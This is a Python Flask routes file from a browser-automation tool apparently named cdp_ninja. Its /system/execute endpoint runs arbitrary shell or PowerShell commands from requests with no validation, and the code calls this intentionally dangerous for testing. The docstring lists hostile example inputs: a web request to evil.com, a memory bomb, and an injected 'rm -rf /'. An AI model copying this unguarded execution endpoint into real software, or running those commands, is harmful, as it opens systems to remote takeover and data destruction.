"""
System Routes - RAW system commands and PowerShell execution
PowerShell toggle required - dangerous by design for testing
"""

import logging
import subprocess
import platform
from flask import Blueprint, jsonify, request
from cdp_ninja.core import get_global_pool
from cdp_ninja.utils.error_reporter import crash_reporter
from cdp_ninja.config import config

logger = logging.getLogger(__name__)
system_routes = Blueprint('system', __name__)


@system_routes.route('/system/execute', methods=['POST'])
def execute_command():
    """
    Execute RAW system commands - PowerShell/CMD/Bash

    @route POST /system/execute
    @param {string} command - ANY command to execute
    @param {string} [shell] - Shell type (powershell, cmd, bash, sh)
    @param {number} [timeout] - Command timeout in seconds
    @param {boolean} [capture_output] - Capture stdout/stderr
    @returns {object} Command execution result or crash data

    @example
    // Windows PowerShell (requires ENABLE_POWERSHELL=true)
    {"command": "Get-Process", "shell": "powershell"}

    // Dangerous PowerShell - test RCE
    {"command": "Invoke-WebRequest -Uri evil.com", "shell": "powershell"}

    // Memory bomb - test limits
    {"command": "while($true) { $a += 'x' * 1000000 }", "shell": "powershell"}

    // Linux/macOS bash
    {"command": "ps aux", "shell": "bash"}

    // Windows CMD
    {"command": "dir C:\\", "shell": "cmd"}

    // Malformed commands - see what happens
    {"command": "'; rm -rf / #", "shell": "bash"}
    """
    try:
        if not config.enable_powershell:
            return jsonify({
                "blocked": True,
                "error": "PowerShell execution disabled",
                "message": "Set ENABLE_POWERSHELL=true to enable dangerous system commands",
                "security_note": "This is intentionally dangerous for testing purposes"
            }), 403

        data = request.get_json() or {}
        command = data.get('command', '')  # Could be anything dangerous
        shell = data.get('shell', 'powershell' if platform.system() == 'Windows' else 'bash')
        timeout = data.get('timeout', 30)  # User-controlled timeout
        capture_output = data.get('capture_output', True)

        # Build shell command - NO sanitization
        if shell.lower() == 'powershell':
            if platform.system() != 'Windows':
                return jsonify({
                    "error": "PowerShell not available on this platform",
                    "platform": platform.system(),
                    "available_shells": ["bash", "sh"]
                }), 400

            # RAW PowerShell execution
            full_command = ['powershell.exe', '-Command', command]

        elif shell.lower() == 'cmd':
            if platform.system() != 'Windows':
                return jsonify({
                    "error": "CMD not available on this platform",
                    "platform": platform.system(),
                    "available_shells": ["bash", "sh"]
                }), 400

            # RAW CMD execution
            full_command = ['cmd.exe', '/c', command]

        elif shell.lower() in ['bash', 'sh']:
            # RAW bash/sh execution
            shell_path = '/bin/bash' if shell.lower() == 'bash' else '/bin/sh'
            full_command = [shell_path, '-c', command]

        else:
            # Unknown shell - try it anyway
            full_command = [shell, '-c', command]

        # Execute with NO validation
        if capture_output:
            result = subprocess.run(
                full_command,
                capture_output=True,
                text=True,
                timeout=timeout,
                shell=False  # Use list form for some protection
            )

            return jsonify({
                "success": result.returncode == 0,
                "command": command,
                "shell": shell,
                "return_code": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "platform": platform.system(),
                "timeout": timeout
            })
        else:
            # Fire and forget
            subprocess.Popen(
                full_command,
                shell=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            return jsonify({
                "success": True,
                "command": command,
                "shell": shell,
                "mode": "fire_and_forget",
                "platform": platform.system()
            })

    except subprocess.TimeoutExpired:
        return jsonify({
            "timeout": True,
            "command": command,
            "shell": shell,
            "timeout_seconds": timeout,
            "message": "Command execution timed out"
        }), 408

    except Exception as e:
        crash_data = crash_reporter.report_crash(
            operation="execute_command",
            error=e,
            request_data=data
        )

        return jsonify({
            "crash": True,
            "error": str(e),
            "command": data.get('command'),
            "shell": data.get('shell'),
            "crash_id": crash_data.get('timestamp'),
            "security_note": "Command execution is intentionally dangerous"
        }), 500


@system_routes.route('/system/info', methods=['GET'])
def get_system_info():
    """
    Get system information and capabilities

    @route GET /system/info
    @returns {object} System platform, PowerShell status, available shells
    """
    try:
        system_info = {
            "platform": platform.system(),
            "platform_release": platform.release(),
            "platform_version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "python_version": platform.python_version(),
            "powershell_enabled": config.enable_powershell,
            "available_shells": []
        }

        # Check available shells
        if platform.system() == 'Windows':
            system_info["available_shells"] = ["powershell", "cmd"]

            # Check if PowerShell is actually available
            try:
                subprocess.run(['powershell.exe', '-Command', 'echo test'],
                             capture_output=True, timeout=5)
                system_info["powershell_available"] = True
            except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.SubprocessError) as e:
                logger.debug(f"PowerShell availability check failed: {e}")
                system_info["powershell_available"] = False
        else:
            system_info["available_shells"] = ["bash", "sh"]

            # Check bash availability
            try:
                subprocess.run(['/bin/bash', '--version'],
                             capture_output=True, timeout=5)
                system_info["bash_available"] = True
            except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.SubprocessError) as e:
                logger.debug(f"Bash availability check failed: {e}")
                system_info["bash_available"] = False

        return jsonify({
            "system_info": system_info,
            "security_warning": "PowerShell execution is intentionally dangerous when enabled"
        })

    except Exception as e:
        crash_data = crash_reporter.report_crash(
            operation="get_system_info",
            error=e
        )

        return jsonify({
            "crash": True,
            "error": str(e),
            "crash_id": crash_data.get('timestamp')
        }), 500


@system_routes.route('/system/processes', methods=['GET'])
def get_processes():
    """
    Get running processes using CDP Runtime evaluation

    @route GET /system/processes
    @returns {object} Browser process information via JavaScript
    """
    try:
        pool = get_global_pool()
        cdp = pool.acquire()

        try:
            # Get browser-visible process info via JavaScript
            code = """
                (() => {
                    const info = {
                        user_agent: navigator.userAgent,
                        platform: navigator.platform,
                        memory: performance.memory ? {
                            used: performance.memory.usedJSHeapSize,
                            total: performance.memory.totalJSHeapSize,
                            limit: performance.memory.jsHeapSizeLimit
                        } : null,
                        connection: navigator.connection ? {
                            effective_type: navigator.connection.effectiveType,
                            downlink: navigator.connection.downlink,
                            rtt: navigator.connection.rtt
                        } : null,
                        hardware_concurrency: navigator.hardwareConcurrency,
                        max_touch_points: navigator.maxTouchPoints,
                        online: navigator.onLine,
                        cookie_enabled: navigator.cookieEnabled,
                        do_not_track: navigator.doNotTrack,
                        language: navigator.language,
                        languages: navigator.languages
                    };
                    return info;
                })()
            """

            result = cdp.send_command('Runtime.evaluate', {
                'expression': code,
                'returnByValue': True
            })

            return jsonify({
                "success": 'error' not in result,
                "browser_info": result.get('result', {}).get('result', {}).get('value'),
                "cdp_result": result,
                "note": "Limited to browser-accessible information via CDP"
            })

        finally:
            pool.release(cdp)

    except Exception as e:
        crash_data = crash_reporter.report_crash(
            operation="get_processes",
            error=e
        )

        return jsonify({
            "crash": True,
            "error": str(e),
            "crash_id": crash_data.get('timestamp')
        }), 500


@system_routes.route('/system/chrome/info', methods=['GET'])
def get_chrome_info():
    """
    Get Chrome browser information via CDP

    @route GET /system/chrome/info
    @returns {object} Chrome version, capabilities, debugging info
    """
    try:
        pool = get_global_pool()
        cdp = pool.acquire()

        try:
            # Get Chrome version info
            version_result = cdp.send_command('Browser.getVersion')

            # Get browser targets
            targets_result = cdp.send_command('Target.getTargets')

            return jsonify({
                "success": True,
                "chrome_version": version_result.get('result', {}),
                "targets": targets_result.get('result', {}),
                "connection_status": "connected",
                "debugging_enabled": True
            })

        finally:
            pool.release(cdp)

    except Exception as e:
        crash_data = crash_reporter.report_crash(
            operation="get_chrome_info",
            error=e
        )

        return jsonify({
            "crash": True,
            "error": str(e),
            "crash_id": crash_data.get('timestamp'),
            "possible_causes": [
                "Chrome not running with debugging enabled",
                "CDP connection lost",
                "Chrome crashed or closed"
            ]
        }), 500